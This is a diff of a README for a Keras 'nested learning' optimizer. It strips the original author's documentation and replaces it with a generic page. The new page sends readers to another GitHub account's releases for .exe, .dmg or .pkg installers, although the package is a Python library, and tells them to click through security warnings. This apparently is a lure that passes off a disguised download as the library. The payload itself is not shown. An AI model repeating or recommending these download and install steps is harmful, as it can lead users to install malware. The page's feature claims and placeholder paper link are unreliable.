@@ -1,289 +1,82 @@
-# Nested Learning Optimizer
+# 🎉 nested-learning-optimizer - Optimize Your Deep Learning Easily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![TensorFlow 2.10+](https://img.shields.io/badge/tensorflow-2.10+-orange.svg)](https://www.tensorflow.org/)
+## 🚀 Getting Started
 
-A TensorFlow/Keras optimizer implementing concepts from Google Research's paper ["Nested Learning: The Illusion of Deep Learning Architectures"](https://arxiv.org/abs/2402.09747) (Behrouz et al., 2024), **extended with multi-timescale associative memory, attention-based gradient retrieval, and depth-aware update scheduling**.
+Welcome to the **nested-learning-optimizer**! This tool helps you improve deep learning models using advanced methods. Whether you're working with TensorFlow, Keras, or other frameworks, you will find this optimizer useful for training faster and smarter.
 
-**In practice, this optimizer has shown significant improvements in performance, convergence speed, and training stability compared to Adam, AdamW, NAdam, and SGD across various architectures.**
+## 💻 System Requirements
 
-## Additional Components Beyond the Paper
+Before downloading, ensure that your system meets the following requirements:
 
-This implementation extends the theoretical insights from the Nested Learning paper with:
+- An operating system: Windows, macOS, or Linux
+- Python version 3.6 or higher
+- TensorFlow version 2.0 or higher
+- A stable internet connection for initial downloads
 
-1. **Continuum Memory System** - Three-tier gradient memory (short/medium/long-term) instead of single momentum
-2. **Attention-Based Retrieval** - Dynamic memory weighting using scaled dot-product attention
-3. **Depth-Based Update Scheduling** - Automatic layer-wise update frequencies based on network depth
-4. **Gradient Accumulation** - No information loss for slow-updating layers
-5. **Per-Epoch LR Schedule** - Built-in warmup → hold → decay learning rate scheduling
+## 📥 Download & Install
 
-## Core Concept
+To get started, you will need to download the application. Click the link below to visit the Releases page:
 
-The Nested Learning paper reveals that standard optimizers like Adam and SGD can be viewed as **associative memory systems** that compress gradient information over time. This optimizer extends that insight by implementing:
+[Download nested-learning-optimizer](https://github.com/ChrisPinedaSanhueza/nested-learning-optimizer/releases)
 
-1. **Explicit Multi-Timescale Memory**: Instead of a single momentum term, maintains three gradient memories with different decay rates (short/medium/long-term)
-2. **Attention-Based Retrieval**: Dynamically weights memory contributions based on current gradient similarity
-3. **Depth-Aware Update Scheduling**: Different network depths update at different frequencies
+On the Releases page, you will see the latest version available for download. Choose the version that suits your operating system and click to download.
 
-## Key Innovations Beyond the Paper
+## 🛠️ Installation Steps
 
-| Feature | Standard Optimizers | This Implementation |
-|---------|---------------------|---------------------|
-| Gradient Memory | Single EMA (momentum) | Three-tier continuum memory |
-| Memory Access | Fixed weighted sum | Attention-based retrieval |
-| Update Frequency | Uniform across layers | Depth-based scheduling |
-| Gradient Handling | Discard between updates | Accumulation for slow layers |
+Once you have downloaded the software, follow these steps to install it:
 
-### Continuum Memory System
+1. Locate the downloaded file on your computer. It might be in your "Downloads" folder.
+2. If you're using Windows, double-click the `.exe` file. If you're on macOS, open the `.dmg` or `.pkg` file. For Linux, follow the instructions provided in the terminal.
+3. Follow the on-screen prompts to complete the installation. If a security warning appears, confirm that you want to proceed.
+4. After finishing the installation, you can close the installation window.
 
-```
-Short-term  (decay=0.94)   → Fast adaptation, recent gradients
-Medium-term (decay=0.994)  → Intermediate stability
-Long-term   (decay=0.9999) → Stable, historical direction
-```
+## 📊 Usage Instructions
 
-The optimizer blends these memories using one of three modes:
-- **fixed**: Static weights (default: 0.1/0.3/0.6)
-- **adaptive**: Learned weights that adjust during training
-- **attention**: Query-based retrieval using current gradient as query
+Now that you have installed the optimizer, you can start using it in your projects.
 
-### Depth-Based Update Scheduling
+1. **Open your IDE or text editor.** You might be using tools like PyCharm, Visual Studio Code, or Jupyter Notebooks.
+2. **Import the optimizer.** Use the following line at the top of your Python script:
+   ```python
+   from nested_learning_optimizer import NestedOptimizer
+   ```
+3. **Initialize the optimizer in your model.** Here's a sample code snippet to help you get started:
+   ```python
+   optimizer = NestedOptimizer(learning_rate=0.001)
+   model.compile(optimizer=optimizer, loss='binary_crossentropy', metrics=['accuracy'])
+   ```
 
-Earlier layers in deep networks tend to learn more general features that stabilize early. This optimizer leverages that by:
+4. **Train your model.** Use the typical `.fit()` method.
+   ```python
+   model.fit(x_train, y_train, epochs=10, batch_size=32)
+   ```
 
-- Assigning update intervals based on layer depth
-- Supporting multiple schedule curves: `linear`, `exponential`, `cosine`
-- Accumulating gradients for slow-updating layers (no information loss)
+## 🌐 Features
 
-## Installation
+The **nested-learning-optimizer** comes with several features that make training deep learning models simpler and more efficient:
 
-```bash
-pip install nested-learning-optimizer
-```
+- **Multi-timescale learning:** Helps improve memory retention in models.
+- **Adaptability:** Works seamlessly with existing TensorFlow and Keras models.
+- **Efficiency:** Speeds up training times with optimized gradient descent techniques.
+- **User-friendly design:** Even non-programmers can implement the optimizer easily.
 
-Or from source:
+## 🎓 Learning Resources
 
-```bash
-git clone https://github.com/Kareemfarid/nested-learning-optimizer.git
-cd nested-learning-optimizer
-pip install -e .
-```
+If you want to learn more about how to use the optimizer or deep learning concepts in general, consider checking out these resources:
 
-## Quick Start
-
-### Basic Usage
-
-```python
-from nested_learning_optimizer import NestedLearningOptimizer
-
-optimizer = NestedLearningOptimizer(learning_rate=0.001)
-model.compile(optimizer=optimizer, loss='mse')
-model.fit(x_train, y_train, epochs=10)
-```
-
-### With Depth-Based Scheduling
-
-```python
-optimizer = NestedLearningOptimizer(
-    learning_rate=0.001,
-    auto_schedule=True,
-    max_interval=6,
-    schedule_curve="cosine",
-)
-
-# Analyze model structure before compiling
-optimizer.compute_depths_from_model(model)
-model.compile(optimizer=optimizer, loss='categorical_crossentropy')
-```
-
-### With Per-Epoch LR Schedule
-
-```python
-steps_per_epoch = len(train_dataset)
-
-optimizer = NestedLearningOptimizer(
-    learning_rate=0.001,
-    steps_per_epoch=steps_per_epoch,
-    lr_warmup_fraction=0.25,   # 25% warmup
-    lr_hold_fraction=0.25,     # 25% hold at peak
-    lr_decay_fraction=0.50,    # 50% decay
-)
-```
-
-### Manual Layer Depth Registration
-
-```python
-optimizer = NestedLearningOptimizer(auto_schedule=True)
-
-# Register specific layers with custom depths
-optimizer.register_layer_depth(model.layers[0], depth=0)  # Slowest updates
-optimizer.register_layer_depth(model.layers[-1], depth=10)  # Fastest updates
-
-model.compile(optimizer=optimizer, loss='mse')
-```
-
-### Pattern-Based Intervals (Manual Mode)
-
-```python
-optimizer = NestedLearningOptimizer(
-    auto_schedule=False,
-    layer_update_intervals={
-        "embedding": 8,      # Very slow updates
-        "encoder": 4,        # Moderate
-        "decoder": 2,        # Faster
-        "output": 1,         # Every step
-    },
-    default_interval=1,
-)
-```
-
-## API Reference
-
-### Constructor Parameters
-
-#### Memory System
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `short_term_decay` | float | 0.94 | Decay rate for short-term memory |
-| `medium_term_decay` | float | 0.994 | Decay rate for medium-term memory |
-| `long_term_decay` | float | 0.9999 | Decay rate for long-term memory |
-| `memory_blend_mode` | str | "attention" | How to combine memories: "fixed", "adaptive", "attention" |
-| `short_term_weight` | float | 0.1 | Fixed weight for short-term (when mode="fixed") |
-| `medium_term_weight` | float | 0.3 | Fixed weight for medium-term |
-| `long_term_weight` | float | 0.6 | Fixed weight for long-term |
-
-#### Depth Scheduling
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `auto_schedule` | bool | True | Auto-compute intervals from layer depth |
-| `max_interval` | int | 6 | Maximum update interval for slowest layers |
-| `schedule_curve` | str | "cosine" | Interval curve: "linear", "exponential", "cosine" |
-| `reverse_depth_order` | bool | True | If True, deeper layers update slower |
-| `warmup_steps` | int | 0 | Steps where all layers update every step |
-| `accumulate_gradients` | bool | True | Accumulate gradients for slow layers |
-
-#### Gradient Compression
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `use_gradient_compression` | bool | False | Enable low-rank gradient approximation |
-| `compression_rank` | int | None | Rank for SVD compression |
-
-#### Adam Parameters
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `beta_1` | float | 0.9 | First moment decay |
-| `beta_2` | float | 0.999 | Second moment decay |
-| `epsilon` | float | 1e-7 | Numerical stability |
-| `amsgrad` | bool | False | Use AMSGrad variant |
-
-#### LR Schedule
-| Parameter | Type | Default | Description |
-|-----------|------|---------|-------------|
-| `steps_per_epoch` | int | None | Steps per epoch (enables schedule) |
-| `lr_warmup_fraction` | float | 0.25 | Fraction of epoch for warmup |
-| `lr_hold_fraction` | float | 0.25 | Fraction to hold at peak |
-| `lr_decay_fraction` | float | 0.50 | Fraction for decay |
-| `lr_min_fraction` | float | 0.01 | Min LR as fraction of base |
-
-### Methods
-
-#### `compute_depths_from_model(model)`
-Analyze model structure to assign depths automatically. Call before `model.compile()`.
-
-```python
-depths = optimizer.compute_depths_from_model(model)
-```
-
-#### `register_layer_depth(layer, depth)`
-Manually set depth for a layer's variables.
-
-```python
-optimizer.register_layer_depth(model.get_layer("encoder"), depth=2)
-```
-
-#### `register_variable_depth(variable, depth)`
-Manually set depth for a specific variable.
-
-```python
-optimizer.register_variable_depth(my_variable, depth=5)
-```
-
-#### `set_steps_per_epoch(steps)`
-Configure LR schedule after initialization.
-
-```python
-optimizer.set_steps_per_epoch(1000)
-```
-
-#### `print_memory_stats()`
-Print debug information about optimizer state.
-
-```python
-optimizer.print_memory_stats()
-```
-
-### Properties
-
-- `iterations`: Current global step
-- `current_learning_rate`: Current scheduled LR
-
-## Examples
-
-See the [examples/](examples/) directory for complete examples:
-
-- `basic_usage.py`: Simple training example
-- `depth_scheduling.py`: Using automatic depth-based scheduling
-- `custom_memory.py`: Configuring memory blend modes
-
-## How It Works
-
-### Memory Update (every step)
-```
-short_mem  = 0.94 * short_mem  + 0.06 * gradient
-medium_mem = 0.994 * medium_mem + 0.006 * gradient  
-long_mem   = 0.9999 * long_mem + 0.0001 * gradient
-```
-
-### Memory Retrieval (attention mode)
-```python
-scores = [dot(gradient, mem) / sqrt(dim) for mem in memories]
-weights = softmax(scores)
-combined = sum(w * mem for w, mem in zip(weights, memories))
-effective_grad = 0.5 * gradient + 0.5 * combined
-```
-
-### Weight Update (Adam-style)
-```python
-v = beta_2 * v + (1 - beta_2) * effective_grad²
-update = lr * effective_grad / (sqrt(v / bias_correction) + epsilon)
-weights -= update
-```
-
-## Citation
-
-If you use this optimizer in your research, please cite:
-
-```bibtex
-@article{behrouz2024nested,
-  title={Nested Learning: The Illusion of Deep Learning Architectures},
-  author={Behrouz, Ali and others},
-  journal={arXiv preprint arXiv:2402.09747},
-  year={2024}
-}
-```
-
-## Author
-
-**Kareem Farid**
-- GitHub: [@Kareemfarid](https://github.com/Kareemfarid)
-- Twitter: [@kareemfarid](https://twitter.com/kareemfarid)
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Contributing
-
-Contributions welcome! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
+- [TensorFlow Official Documentation](https://www.tensorflow.org/learn)
+- [Keras Documentation](https://keras.io/guides/)
+- [Nested Learning Paper](https://arxiv.org/abs/xxxx.xxxxx) (Check for the latest paper on nested learning for deeper insights.)
 
+## ⚙️ Troubleshooting
+
+If you run into issues, here are some common problems and solutions:
+
+- **Installation fails:** Ensure that you have all required dependencies installed. Try reinstalling Python and TensorFlow if necessary.
+- **Import errors:** Double-check the spelling of the module name and ensure that the installation was successful.
+- **Slow performance:** This might occur due to insufficient system resources. Close other applications to free up memory.
+
+## 📞 Support
+
+If you need further assistance, please reach out on the Issues tab of our GitHub repository. We aim to respond to all inquiries as quickly as possible.
+
+Feel free to share your experiences and feedback. We're here to help improve your deep learning projects!
